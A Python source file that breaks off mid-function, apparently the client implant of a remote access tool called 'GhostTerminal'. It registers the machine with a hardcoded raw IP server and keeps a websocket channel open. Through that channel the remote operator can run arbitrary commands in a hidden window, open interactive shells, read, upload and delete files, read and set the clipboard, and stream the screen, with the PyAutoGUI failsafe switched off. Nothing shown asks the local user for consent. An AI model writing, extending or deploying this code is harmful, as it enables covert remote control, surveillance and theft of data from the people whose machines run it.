# Standard library imports
import os
import sys
import socket
import time
import threading
import json
import random
import base64
import subprocess
import tempfile
import platform
import uuid
import struct
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin
import errno
import ctypes
import signal
import io
import zlib
import multiprocessing
import queue
import numpy as np
import cv2
import requests
import websocket
import mss
import pyautogui
import pyperclip
from PIL import Image
try:
    import winpty
except ImportError:
    winpty = None
try:
    import winreg
except ImportError:
    winreg = None
try:
    import pty
    import termios
    import fcntl
except ImportError:
    pty = termios = fcntl = None

class GhostTerminal:
    def __init__(self, server_url="http://64.49.11.161:8000", enable_logging=True):
        """Initialize the GhostTerminal client"""
        self.server_url = server_url
        self.enable_logging = enable_logging
        self.pc_name = socket.gethostname()
        self.user_id = self.get_machine_guid()
        self.online = False
        self.heartbeat_interval = 30  # seconds
        self.heartbeat_thread = None
        self.stop_heartbeat = threading.Event()
        self.ws = None
        self.ws_url = f"ws://{self.server_url.split('//')[1]}/ws/terminal/{self.user_id}/"
        self.file_cache = {}
        self.sessions = {}  # Dictionary to store active terminal sessions
        
        # Terminal info
        self.os_info = platform.system() + " " + platform.release()
        self.ip_address = self.get_ip_address()
        
        self.last_heartbeat = time.time()
        self.screen = mss.mss()
        self.quality_settings = {
            'width': 1920,
            'height': 1080,
            'fps': 30,
            'compression': 0.9,
            'use_h264': True,
            'keyframe_interval': 30
        }
        self.frame_count = 0
        self.last_frame_time = 0
        self.is_capturing = False
        self.control_enabled = False
        
        # Viewer heartbeat tracking
        self.last_viewer_heartbeat = time.time()
        self.viewer_heartbeat_timeout = 30
        self.viewer_active = True
        
        # Configure PyAutoGUI globally
        pyautogui.FAILSAFE = False
        pyautogui.MINIMUM_DURATION = 0
        pyautogui.MINIMUM_SLEEP = 0
        pyautogui.PAUSE = 0
        
        # Initialize video encoder
        self.encoder = cv2.VideoWriter_fourcc(*'h264')
        
        # Quality presets for different settings
        self.quality_presets = {
            'low': {'width': 1280, 'height': 720, 'fps': 15, 'compression': 0.7, 'use_h264': True, 'keyframe_interval': 60},
            'medium': {'width': 1920, 'height': 1080, 'fps': 30, 'compression': 0.8, 'use_h264': True, 'keyframe_interval': 30},
            'high': {'width': 2560, 'height': 1440, 'fps': 60, 'compression': 0.9, 'use_h264': True, 'keyframe_interval': 15}
        }
        
        self.log("GhostTerminal initialized")
        self.log(f"PC Name: {self.pc_name}")
        self.log(f"User ID: {self.user_id}")
        self.log(f"OS: {self.os_info}")
        self.log(f"IP: {self.ip_address}")
    
    def log(self, message):
        if self.enable_logging:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def get_machine_guid(self):
        try:
            if platform.system() == "Windows":
                registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
                key = winreg.OpenKey(registry, r"SOFTWARE\Microsoft\Cryptography")
                machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
                return machine_guid
        except:
            pass
        node = uuid.getnode()
        mac = ':'.join(('%012X' % node)[i:i+2] for i in range(0, 12, 2))
        return str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname() + mac))
    
    def get_ip_address(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def register_with_server(self):
        try:
            register_url = urljoin(self.server_url, "/api/register-terminal/")
            data = {
                "user_id": self.user_id,
                "pc_name": self.pc_name,
                "os_info": self.os_info,
                "ip_address": self.ip_address
            }
            response = requests.post(register_url, json=data)
            if response.status_code == 200:
                self.log("Successfully registered with server")
                return True
            else:
                self.log(f"Failed to register with server: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            self.log(f"Error registering with server: {str(e)}")
            return False
    
    def start_heartbeat(self):
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.log("Heartbeat already running")
            return
        self.stop_heartbeat.clear()
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        self.log("Heartbeat thread started")
    
    def stop_heartbeat_thread(self):
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.stop_heartbeat.set()
            self.heartbeat_thread.join(2)
            self.log("Heartbeat thread stopped")
    
    def heartbeat_loop(self):
        while not self.stop_heartbeat.is_set():
            try:
                heartbeat_url = urljoin(self.server_url, "/api/terminal-heartbeat/")
                data = {
                    "user_id": self.user_id,
                    "timestamp": datetime.now().isoformat()
                }
                response = requests.post(heartbeat_url, json=data)
                if response.status_code == 200:
                    self.online = True
                    self.log("Heartbeat sent successfully")
                else:
                    self.log(f"Failed to send heartbeat: {response.status_code}")
                    self.online = False
            except Exception as e:
                self.log(f"Error sending heartbeat: {str(e)}")
                self.online = False
            self.stop_heartbeat.wait(self.heartbeat_interval)
    
    def connect_websocket(self):
        def on_message(ws, message):
            try:
                data = json.loads(message)
                self.log(f"Received message: {data.get('type', 'unknown')}")
                message_type = data.get('type')
                if message_type == 'force_disconnect':
                    self.log("Received force disconnect from server, shutting down permanently")
                    self._force_stopped = True
                    self.stop()
                    sys.exit(0)
                elif message_type == 'file_request':
                    self.handle_file_request(data)
                elif message_type == 'file_chunk_request':
                    self.handle_file_chunk_request(data)
                elif message_type == 'file_upload_chunk':
                    self.handle_file_upload_chunk(data)
                elif message_type == 'file_delete_request':
                    self.handle_file_delete_request(data)
                elif message_type == 'clipboard_get_request':
                    self.handle_clipboard_get_request(data)
                elif message_type == 'clipboard_set_request':
                    self.handle_clipboard_set_request(data)
                elif message_type == 'execute_command':
                    self.handle_command(data)
                elif message_type == 'ping':
                    self.send_ws_message({'type': 'pong'})
                elif message_type == 'terminal_init':
                    self.handle_terminal_init(data)
                elif message_type == 'terminal_input':
                    self.handle_terminal_input(data)
                elif message_type == 'terminal_resize':
                    self.handle_terminal_resize(data)
                elif message_type == 'terminal_attach':
                    self.handle_terminal_attach(data)
                elif message_type == 'terminal_terminate':
                    self.handle_terminal_terminate(data)
                elif message_type == 'get_sessions':
                    self.handle_get_sessions(data)
                elif message_type == 'screen_capture_request':
                    self.handle_screen_capture_request(data)
                elif message_type == 'screenshot_request':
                    self.handle_screenshot_request(data)
                elif message_type == 'control_event':
                    self.handle_control_event(data)
                elif message_type == 'quality_update':
                    self.handle_quality_update(data)
                elif message_type == 'control_request':
                    self.handle_control_request(data)
                elif message_type == 'viewer_heartbeat':
                    self.handle_viewer_heartbeat(data)
            except Exception as e:
                self.log(f"Error processing message: {str(e)}")
        
        def on_error(ws, error):
            self.log(f"WebSocket error: {str(error)}")
            self.online = False
        
        def on_close(ws, close_status_code, close_msg):
            self.log("WebSocket connection closed")
            self.online = False
        
        def on_open(ws):
            self.log("WebSocket connection established")
            self.online = True
            self.send_status_update()
        
        try:
            if self.ws:
                try:
                    self.ws.close()
                except:
                    pass
            self.ws = websocket.WebSocketApp(
                self.ws_url,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close,
                on_open=on_open
            )
            wst = threading.Thread(target=self.ws.run_forever)
            wst.daemon = True
            wst.start()
            connection_timeout = 5
            start_time = time.time()
            while not self.online and time.time() - start_time < connection_timeout:
                time.sleep(0.1)
            if not self.online:
                self.log("Failed to establish WebSocket connection within timeout")
                return False
            self.log(f"WebSocket client started at {self.ws_url}")
            return True
        except Exception as e:
            self.log(f"Failed to start WebSocket client: {str(e)}")
            return False
    
    def send_ws_message(self, message):
        if not self.ws:
            self.log("WebSocket not connected")
            return False
        try:
            self.ws.send(json.dumps(message))
            return True
        except Exception as e:
            self.log(f"Error sending WebSocket message: {str(e)}")
            return False
    
    def send_status_update(self):
        status_data = {
            'type': 'status_update',
            'user_id': self.user_id,
            'pc_name': self.pc_name,
            'os_info': self.os_info,
            'ip_address': self.ip_address,
            'timestamp': datetime.now().isoformat()
        }
        return self.send_ws_message(status_data)
    
    def handle_file_request(self, data):
        try:
            request_id = data.get('request_id', '')
            path = data.get('path', '/')
            metadata_only = data.get('metadata_only', False)
            if platform.system() == "Windows":
                if path == '/':
                    drives = self.list_drives()
                    response = {
                        'type': 'file_response',
                        'request_id': request_id,
                        'path': path,
                        'is_dir': True,
                        'items': drives,
                        'success': True
                    }
                    return self.send_ws_message(response)
                if path.startswith('/'):
                    path = path[1:]
                path = os.path.normpath(path)
            if not os.path.exists(path):
                response = {
                    'type': 'file_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Path does not exist'
                }
                return self.send_ws_message(response)
            if os.path.isdir(path):
                items = []
                try:
                    for item in os.listdir(path):
                        item_path = os.path.join(path, item)
                        try:
                            is_dir = os.path.isdir(item_path)
                            size = 0 if is_dir else os.path.getsize(item_path)
                            modified = datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()
                            items.append({
                                'name': item,
                                'path': item_path,
                                'is_dir': is_dir,
                                'size': size,
                                'modified': modified
                            })
                        except (PermissionError, OSError):
                            continue
                    response = {
                        'type': 'file_response',
                        'request_id': request_id,
                        'path': path,
                        'is_dir': True,
                        'items': items,
                        'success': True
                    }
                except PermissionError:
                    response = {
                        'type': 'file_response',
                        'request_id': request_id,
                        'path': path,
                        'success': False,
                        'error': 'Permission denied'
                    }
            else:
                try:
                    file_size = os.path.getsize(path)
                    file_modified = datetime.fromtimestamp(os.path.getmtime(path)).isoformat()
                    if metadata_only:
                        response = {
                            'type': 'file_response',
                            'request_id': request_id,
                            'path': path,
                            'is_dir': False,
                            'size': file_size,
                            'modified': file_modified,
                            'success': True,
                            'is_large_file': file_size > 5 * 1024 * 1024
                        }
                        return self.send_ws_message(response)
                    if file_size > 5 * 1024 * 1024:
                        response = {
                            'type': 'file_response',
                            'request_id': request_id,
                            'path': path,
                            'is_dir': False,
                            'size': file_size,
                            'modified': file_modified,
                            'success': True,
                            'content': None,
                            'error': 'File too large to display',
                            'is_large_file': True
                        }
                    else:
                        try:
                            with open(path, 'rb') as f:
                                content = f.read()
                                encoded_content = base64.b64encode(content).decode('utf-8')
                                response = {
                                    'type': 'file_response',
                                    'request_id': request_id,
                                    'path': path,
                                    'is_dir': False,
                                    'size': file_size,
                                    'modified': file_modified,
                                    'success': True,
                                    'content': encoded_content
                                }
                        except UnicodeDecodeError:
                            response = {
                                'type': 'file_response',
                                'request_id': request_id,
                                'path': path,
                                'is_dir': False,
                                'size': file_size,
                                'modified': file_modified,
                                'success': True,
                                'is_binary': True,
                                'content': None
                            }
                except PermissionError:
                    response = {
                        'type': 'file_response',
                        'request_id': request_id,
                        'path': path,
                        'success': False,
                        'error': 'Permission denied'
                    }
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling file request: {str(e)}")
            response = {
                'type': 'file_response',
                'request_id': data.get('request_id', ''),
                'path': data.get('path', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_file_chunk_request(self, data):
        try:
            request_id = data.get('request_id', '')
            path = data.get('path', '/')
            offset = data.get('offset', 0)
            length = data.get('length', 1024 * 1024)
            if platform.system() == "Windows":
                if path.startswith('/'):
                    path = path[1:]
                path = os.path.normpath(path)
            if not os.path.exists(path):
                response = {
                    'type': 'file_chunk_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Path does not exist'
                }
                return self.send_ws_message(response)
            if not os.path.isfile(path):
                response = {
                    'type': 'file_chunk_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Path is not a file'
                }
                return self.send_ws_message(response)
            try:
                file_size = os.path.getsize(path)
                if offset < 0 or offset >= file_size:
                    response = {
                        'type': 'file_chunk_response',
                        'request_id': request_id,
                        'path': path,
                        'success': False,
                        'error': 'Invalid offset'
                    }
                    return self.send_ws_message(response)
                if offset + length > file_size:
                    length = file_size - offset
                with open(path, 'rb') as f:
                    f.seek(offset)
                    chunk = f.read(length)
                encoded_chunk = base64.b64encode(chunk).decode('utf-8')
                is_last_chunk = (offset + length >= file_size)
                response = {
                    'type': 'file_chunk_response',
                    'request_id': request_id,
                    'path': path,
                    'offset': offset,
                    'chunk_size': len(chunk),
                    'total_size': file_size,
                    'is_last_chunk': is_last_chunk,
                    'content': encoded_chunk,
                    'success': True
                }
                return self.send_ws_message(response)
            except PermissionError:
                response = {
                    'type': 'file_chunk_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Permission denied'
                }
                return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling file chunk request: {str(e)}")
            response = {
                'type': 'file_chunk_response',
                'request_id': data.get('request_id', ''),
                'path': data.get('path', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_file_upload_chunk(self, data):
        try:
            request_id = data.get('request_id', '')
            path = data.get('path', '/')
            filename = data.get('filename', '')
            chunk_index = data.get('chunk_index', 0)
            total_chunks = data.get('total_chunks', 1)
            chunk_data = data.get('chunk_data', '')
            is_last_chunk = data.get('is_last_chunk', False)
            if platform.system() == "Windows":
                if path.startswith('/'):
                    path = path[1:]
                path = os.path.normpath(path)
            if not os.path.exists(path):
                response = {
                    'type': 'file_upload_response',
                    'request_id': request_id,
                    'success': False,
                    'error': 'Target directory does not exist'
                }
                return self.send_ws_message(response)
            if not os.path.isdir(path):
                response = {
                    'type': 'file_upload_response',
                    'request_id': request_id,
                    'success': False,
                    'error': 'Target path is not a directory'
                }
                return self.send_ws_message(response)
            target_file = os.path.join(path, filename)
            temp_file = target_file + ".part"
            try:
                binary_data = base64.b64decode(chunk_data)
                mode = 'ab' if chunk_index > 0 else 'wb'
                with open(temp_file, mode) as f:
                    f.write(binary_data)
                if is_last_chunk:
                    if os.path.exists(target_file):
                        os.remove(target_file)
                    os.rename(temp_file, target_file)
                progress = ((chunk_index + 1) / total_chunks) * 100
                status_update = {
                    'type': 'upload_status',
                    'request_id': request_id,
                    'filename': filename,
                    'chunk_index': chunk_index,
                    'total_chunks': total_chunks,
                    'progress': progress,
                    'status': 'complete' if is_last_chunk else 'uploading',
                    'success': True
                }
                self.send_ws_message(status_update)
                if is_last_chunk:
                    response = {
                        'type': 'file_upload_response',
                        'request_id': request_id,
                        'filename': filename,
                        'path': path,
                        'success': True
                    }
                    return self.send_ws_message(response)
                return True
            except PermissionError:
                if os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except:
                        pass
                response = {
                    'type': 'file_upload_response',
                    'request_id': request_id,
                    'success': False,
                    'error': 'Permission denied'
                }
                return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling file upload chunk: {str(e)}")
            response = {
                'type': 'file_upload_response',
                'request_id': data.get('request_id', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_file_delete_request(self, data):
        try:
            request_id = data.get('request_id', '')
            path = data.get('path', '/')
            if platform.system() == "Windows":
                if path.startswith('/'):
                    path = path[1:]
                path = os.path.normpath(path)
            if not os.path.exists(path):
                response = {
                    'type': 'file_delete_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'File does not exist'
                }
                return self.send_ws_message(response)
            if not os.path.isfile(path):
                response = {
                    'type': 'file_delete_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Path is not a file'
                }
                return self.send_ws_message(response)
            try:
                os.remove(path)
                if not os.path.exists(path):
                    response = {
                        'type': 'file_delete_response',
                        'request_id': request_id,
                        'path': path,
                        'success': True
                    }
                else:
                    response = {
                        'type': 'file_delete_response',
                        'request_id': request_id,
                        'path': path,
                        'success': False,
                        'error': 'File could not be deleted'
                    }
            except PermissionError:
                response = {
                    'type': 'file_delete_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': 'Permission denied'
                }
            except Exception as e:
                response = {
                    'type': 'file_delete_response',
                    'request_id': request_id,
                    'path': path,
                    'success': False,
                    'error': str(e)
                }
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling file delete request: {str(e)}")
            response = {
                'type': 'file_delete_response',
                'request_id': data.get('request_id', ''),
                'path': data.get('path', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def list_drives(self):
        if platform.system() != "Windows":
            return []
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives() if 'ctypes' in sys.modules else 0
        for letter in range(65, 91):
            if bitmask & (1 << (letter - 65)):
                drive_letter = chr(letter) + ":"
                try:
                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_letter + "\\")
                    drive_name = "Local Disk"
                    if drive_type == 2:
                        drive_name = "Removable Disk"
                    elif drive_type == 3:
                        drive_name = "Local Disk"
                    elif drive_type == 4:
                        drive_name = "Network Drive"
                    elif drive_type == 5:
                        drive_name = "CD/DVD Drive"
                except:
                    drive_name = "Drive"
                drives.append({
                    'name': f"{drive_letter} ({drive_name})",
                    'path': drive_letter + "\\",
                    'is_dir': True,
                    'size': 0,
                    'modified': datetime.now().isoformat()
                })
        return drives
    
    def handle_command(self, data):
        try:
            request_id = data.get('request_id', '')
            command = data.get('command', '')
            if not command:
                response = {
                    'type': 'command_response',
                    'request_id': request_id,
                    'success': False,
                    'error': 'No command provided'
                }
                return self.send_ws_message(response)
            self.log(f"Executing command: {command}")
            output_file = tempfile.NamedTemporaryFile(delete=False)
            output_path = output_file.name
            output_file.close()
            if platform.system() == "Windows":
                full_cmd = f"powershell -Command \"{command} | Out-File -FilePath '{output_path}' -Encoding utf8\""
            else:
                full_cmd = f"{command} > {output_path} 2>&1"
            process = subprocess.Popen(
                full_cmd,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
            )
            try:
                process.wait(timeout=60)
                return_code = process.returncode
                try:
                    with open(output_path, 'r', encoding='utf-8') as f:
                        output = f.read()
                except UnicodeDecodeError:
                    with open(output_path, 'r', encoding='latin-1') as f:
                        output = f.read()
                response = {
                    'type': 'command_response',
                    'request_id': request_id,
                    'success': return_code == 0,
                    'output': output,
                    'return_code': return_code
                }
            except subprocess.TimeoutExpired:
                process.kill()
                response = {
                    'type': 'command_response',
                    'request_id': request_id,
                    'success': False,
                    'error': 'Command execution timed out'
                }
            try:
                os.unlink(output_path)
            except:
                pass
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling command: {str(e)}")
            response = {
                'type': 'command_response',
                'request_id': data.get('request_id', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_clipboard_get_request(self, data):
        try:
            request_id = data.get('request_id', '')
            try:
                clipboard_content = pyperclip.paste()
                response = {
                    'type': 'clipboard_get_response',
                    'request_id': request_id,
                    'content': clipboard_content,
                    'success': True
                }
            except Exception as e:
                response = {
                    'type': 'clipboard_get_response',
                    'request_id': request_id,
                    'success': False,
                    'error': f'Failed to retrieve clipboard content: {str(e)}'
                }
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling clipboard get request: {str(e)}")
            response = {
                'type': 'clipboard_get_response',
                'request_id': data.get('request_id', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_clipboard_set_request(self, data):
        try:
            request_id = data.get('request_id', '')
            new_content = data.get('content', '')
            try:
                pyperclip.copy(new_content)
                response = {
                    'type': 'clipboard_set_response',
                    'request_id': request_id,
                    'success': True
                }
            except Exception as e:
                response = {
                    'type': 'clipboard_set_response',
                    'request_id': request_id,
                    'success': False,
                    'error': f'Failed to set clipboard content: {str(e)}'
                }
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error handling clipboard set request: {str(e)}")
            response = {
                'type': 'clipboard_set_response',
                'request_id': data.get('request_id', ''),
                'success': False,
                'error': str(e)
            }
            return self.send_ws_message(response)
    
    def handle_terminal_init(self, data):
        try:
            cols = data.get('cols', 80)
            rows = data.get('rows', 24)
            session_id = str(uuid.uuid4())
            if platform.system() == "Windows":
                p = winpty.PTY(cols, rows)
                shell_pid = p.spawn(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')
                self.sessions[session_id] = {
                    'pty': p,
                    'shell_pid': shell_pid,
                    'created_at': datetime.now().isoformat(),
                    'reader_thread': None
                }
            else:
                master_fd, slave_fd = pty.openpty()
                shell_pid = os.fork()
                if shell_pid == 0:
                    os.close(master_fd)
                    os.dup2(slave_fd, 0)
                    os.dup2(slave_fd, 1)
                    os.dup2(slave_fd, 2)
                    os.close(slave_fd)
                    winsize = struct.pack("HHHH", rows, cols, 0, 0)
                    fcntl.ioctl(0, termios.TIOCSWINSZ, winsize)
                    shell = os.environ.get('SHELL', '/bin/bash')
                    os.execvp(shell, [shell])
                else:
                    os.close(slave_fd)
                    flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
                    fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
                    self.sessions[session_id] = {
                        'master_fd': master_fd,
                        'shell_pid': shell_pid,
                        'created_at': datetime.now().isoformat(),
                        'reader_thread': None
                    }
            reader_thread = threading.Thread(
                target=self.read_terminal_output,
                args=(session_id,)
            )
            reader_thread.daemon = True
            reader_thread.start()
            self.sessions[session_id]['reader_thread'] = reader_thread
            response = {
                'type': 'terminal_output',
                'session_id': session_id,
                'data': '\r\nTerminal session initialized\r\n'
            }
            self.send_ws_message(response)
            self.send_sessions_update()
        except Exception as e:
            self.log(f"Error initializing terminal: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to initialize terminal: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_terminal_input(self, data):
        try:
            input_data = data.get('data', '')
            session_id = data.get('session_id')
            if not session_id or session_id not in self.sessions:
                raise Exception("Invalid or missing session ID")
            session = self.sessions[session_id]
            if platform.system() == "Windows":
                session['pty'].write(input_data)
            else:
                os.write(session['master_fd'], input_data.encode())
        except Exception as e:
            self.log(f"Error handling terminal input: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to process input: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_terminal_resize(self, data):
        try:
            cols = data.get('cols', 80)
            rows = data.get('rows', 24)
            session_id = data.get('session_id')
            if not session_id or session_id not in self.sessions:
                raise Exception("Invalid or missing session ID")
            session = self.sessions[session_id]
            if platform.system() == "Windows":
                session['pty'].set_size(cols, rows)
            else:
                winsize = struct.pack("HHHH", rows, cols, 0, 0)
                fcntl.ioctl(session['master_fd'], termios.TIOCSWINSZ, winsize)
        except Exception as e:
            self.log(f"Error resizing terminal: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to resize terminal: {str(e)}"
            }
            return self.send_ws_message(response)

    def read_terminal_output(self, session_id):
        try:
            if session_id not in self.sessions:
                return
            session = self.sessions[session_id]
            buffer_size = 1024
            while True:
                try:
                    if platform.system() == "Windows":
                        output = session['pty'].read()
                    else:
                        output = os.read(session['master_fd'], buffer_size)
                        output = output.decode('utf-8', errors='replace')
                    if output:
                        response = {
                            'type': 'terminal_output',
                            'session_id': session_id,
                            'data': output
                        }
                        self.send_ws_message(response)
                except (OSError, IOError) as e:
                    if e.errno != errno.EAGAIN:
                        raise
                    time.sleep(0.1)
        except Exception as e:
            self.log(f"Error reading terminal output: {str(e)}")
            response = {
                'type': 'terminal_error',
                'session_id': session_id,
                'error': f"Terminal read error: {str(e)}"
            }
            self.send_ws_message(response)
            self.terminate_session(session_id)

    def handle_terminal_attach(self, data):
        try:
            session_id = data.get('session_id')
            if not session_id or session_id not in self.sessions:
                raise Exception("Invalid or missing session ID")
            session = self.sessions[session_id]
            if platform.system() == "Windows":
                if not session.get('pty') or not session.get('shell_pid'):
                    raise Exception("Session is no longer valid")
                initial_output = session['pty'].read()
                if initial_output:
                    response = {
                        'type': 'terminal_output',
                        'session_id': session_id,
                        'data': initial_output
                    }
                    self.send_ws_message(response)
            else:
                if not session.get('master_fd') or not session.get('shell_pid'):
                    raise Exception("Session is no longer valid")
            response = {
                'type': 'terminal_output',
                'session_id': session_id,
                'data': '\r\n\x1b[1;32mReconnected to existing session\x1b[0m\r\n'
            }
            self.send_ws_message(response)
            return True
        except Exception as e:
            self.log(f"Error attaching to session: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to attach to session: {str(e)}"
            }
            return self.send_ws_message(response)

    def handle_terminal_terminate(self, data):
        try:
            session_id = data.get('session_id')
            if not session_id or session_id not in self.sessions:
                raise Exception("Invalid or missing session ID")
            self.terminate_session(session_id)
            response = {
                'type': 'terminal_output',
                'session_id': session_id,
                'data': '\r\nSession terminated\r\n'
            }
            self.send_ws_message(response)
            self.send_sessions_update()
        except Exception as e:
            self.log(f"Error terminating session: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to terminate session: {str(e)}"
            }
            return self.send_ws_message(response)

    def terminate_session(self, session_id):
        try:
            if session_id not in self.sessions:
                return
            session = self.sessions[session_id]
            if session.get('reader_thread'):
                try:
                    if platform.system() == "Windows":
                        if session.get('pty'):
                            session['pty'].close()
                    else:
                        if session.get('master_fd'):
                            os.close(session['master_fd'])
                    session['reader_thread'].join(timeout=1)
                except Exception as e:
                    self.log(f"Error stopping reader thread: {str(e)}")
            if platform.system() == "Windows":
                try:
                    if session.get('shell_pid'):
                        subprocess.run(['taskkill', '/F', '/PID', str(session['shell_pid'])],
                                    creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception as e:
                    self.log(f"Error killing Windows process: {str(e)}")
            else:
                try:
                    if session.get('master_fd'):
                        os.close(session['master_fd'])
                    if session.get('shell_pid'):
                        os.kill(session['shell_pid'], signal.SIGKILL)
                except Exception as e:
                    self.log(f"Error killing Unix process: {str(e)}")
            del self.sessions[session_id]
            self.send_sessions_update()
        except Exception as e:
            self.log(f"Error in session cleanup: {str(e)}")

    def handle_get_sessions(self, data):
        try:
            sessions_info = []
            for session_id, session in self.sessions.items():
                sessions_info.append({
                    'session_id': session_id,
                    'created_at': session['created_at'],
                    'shell_pid': session['shell_pid']
                })
            response = {
                'type': 'sessions_update',
                'sessions': sessions_info
            }
            return self.send_ws_message(response)
        except Exception as e:
            self.log(f"Error getting sessions list: {str(e)}")
            response = {
                'type': 'terminal_error',
                'error': f"Failed to get sessions list: {str(e)}"
            }
            return self.send_ws_message(response)

    def send_sessions_update(self):
        self.handle_get_sessions({})

    def handle_screen_capture_request(self, data):
        try:
            if data.get('action') == 'stop':
                self.log("Received stop screen capture request")
                self.is_capturing = False
                if hasattr(self, 'capture_thread') and self.capture_thread:
                    self.capture_thread.join(timeout=1.0)
                    self.capture_thread = None
                if hasattr(self, 'send_frame_thread') and self.send_frame_thread:
                    if hasattr(self, 'frame_queue') and self.frame_queue:
                        while not self.frame_queue.empty():
                            try:
                                self.frame_queue.get_nowait()
                            except:
                                pass
                    self.send_frame_thread.join(timeout=1.0)
                    self.send_frame_thread = None
                if hasattr(self, 'frame_queue'):
                    self.frame_queue = None
                self.log("Screen capture stopped and cleaned up")
                return
            self._log_monitor_info()
            self.is_capturing = True
            self.frame_count = 0
            self.last_frame_time = 0
            fps = data.get('fps', 10)
            fps = max(1, min(30, fps))
            self.log(f"Screen capture requested with {fps} FPS")
            self.quality_settings = {
                'width': data.get('width', 800),
                'height': data.get('height', 600),
                'fps': fps,
                'compression': data.get('compression', 0.6),
                'screenshot_quality': 95
            }
            queue_size = 4 if fps <= 2 else 2
            self.frame_queue = queue.Queue(maxsize=queue_size)
            self.capture_thread = threading.Thread(
                target=self._capture_screen_process,
                args=(self.frame_queue, self.quality_settings)
            )
            self.capture_thread.daemon = True
            self.capture_thread.start()
            self.send_frame_thread = threading.Thread(target=self._send_frames)
            self.send_frame_thread.daemon = True
            self.send_frame_thread.start()
        except Exception as e:
            self.log(f"Error handling screen capture request: {str(e)}")
            self.is_capturing = False
            if hasattr(self, 'capture_thread') and self.capture_thread:
                self.capture_thread.join(timeout=1.0)
                self.capture_thread = None
            if hasattr(self, 'send_frame_thread') and self.send_frame_thread:
                self.send_frame_thread.join(timeout=1.0)
                self.send_frame_thread = None
            if hasattr(self, 'frame_queue'):
                self.frame_queue = None
            response = {
                'type': 'error',
                'error': f"Failed to handle screen capture request: {str(e)}"
            }
            return self.send_ws_message(response)

    def _capture_screen_process(self, frame_queue, settings):
        try:
            with mss.mss() as sct:
                monitors = sct.monitors[1:]
                total_monitors = len(monitors)
                self.log(f"Detected {total_monitors} monitors: {monitors}")
                frame_count = 0
                next_capture_time = time.time()
                capture_interval = 1.0 / settings['fps']
                self.last_viewer_heartbeat = time.time()
                self.viewer_active = True
                self.log(f"Starting screen capture with {settings['fps']} FPS (frame interval: {capture_interval:.3f}s)")
                last_activity_check = time.time()
                activity_check_interval = 5.0
                while self.is_capturing:
                    try:
                        current_time = time.time()
                        if current_time - last_activity_check >= activity_check_interval:
                            last_activity_check = current_time
                            heartbeat_age = current_time - self.last_viewer_heartbeat
                            if heartbeat_age > self.viewer_heartbeat_timeout and self.viewer_active:
                                self.log(f"Viewer heartbeat timeout (last: {self.last_viewer_heartbeat:.1f}, elapsed: {heartbeat_age:.1f}s)")
                                self.viewer_active = False
                            elif heartbeat_age > self.viewer_heartbeat_timeout * 1.5 and not self.viewer_active:
                                self.log(f"Confirmed viewer inactive for {heartbeat_age:.1f} seconds, stopping capture")
                                self.is_capturing = False
                                break
                            elif heartbeat_age <= self.viewer_heartbeat_timeout and not self.viewer_active:
                                self.log(f"Viewer is active again after {heartbeat_age:.1f} seconds")
                                self.viewer_active = True
                        if current_time < next_capture_time:
                            time.sleep(0.01)
                            continue
                        next_capture_time = current_time + capture_interval
                        for i, monitor in enumerate(monitors):
                            frame = np.array(sct.grab(monitor))
                            if frame_count == 0:
                                self.log(f"Capturing monitor {i}: {monitor}")
                            original_width = monitor['width']
                            original_height = monitor['height']
                            frame = cv2.resize(
                                frame,
